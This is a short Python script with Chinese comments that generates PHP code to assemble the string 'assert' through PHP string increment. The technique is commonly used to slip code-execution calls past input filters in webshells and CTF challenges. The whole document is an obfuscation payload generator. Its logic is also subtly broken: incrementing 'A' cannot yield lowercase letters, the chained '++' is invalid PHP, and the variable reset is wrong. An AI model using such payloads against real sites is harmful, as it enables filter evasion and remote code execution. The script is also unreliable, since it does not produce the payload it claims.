def generate_php_assert_payload(target_func="assert"):
    """
    生成PHP自增构造assert的payload
    原理：利用PHP字符串自增特性，从'A'开始++得到其他字母
    """
    payload_lines = []
    var_name = "$_"
    result_var = "$___"
    
    # 第一步：获取初始字符 'A'
    payload_lines.append(f"{var_name} = [] . '';")
    payload_lines.append(f"{result_var} = {var_name}[{var_name}]; // 得到 'A'")
    payload_lines.append(f"{var_name} = {result_var};")
    
    # 构造目标函数名
    for char in target_func:
        if char == 'A':
            # 'A' 直接用
            payload_lines.append(f"{result_var} .= {var_name};")
            continue
        
        # 计算需要自增的次数
        start_ord = ord('A')
        target_ord = ord(char)
        increment_times = target_ord - start_ord
        
        # 生成自增语句
        if increment_times > 0:
            increment_str = "++" * increment_times
            payload_lines.append(f"{increment_str}{var_name}; // 得到 '{char}'")
        
        # 拼接字符
        payload_lines.append(f"{result_var} .= {var_name}; // 拼接得到 {target_func[:len(result_var.split('.= ')[-1])+1]}")
        
        # 重置变量为 'A'，准备下一个字符
        payload_lines.append(f"{var_name} = {result_var};")
    
    # 最终输出
    payload_lines.append("echo $___;")
    
    # 打印结果
    print("<?php")
    for line in payload_lines:
        print(line)
    print("?>")

# 生成 assert 的 payload
generate_php_assert_payload("assert")   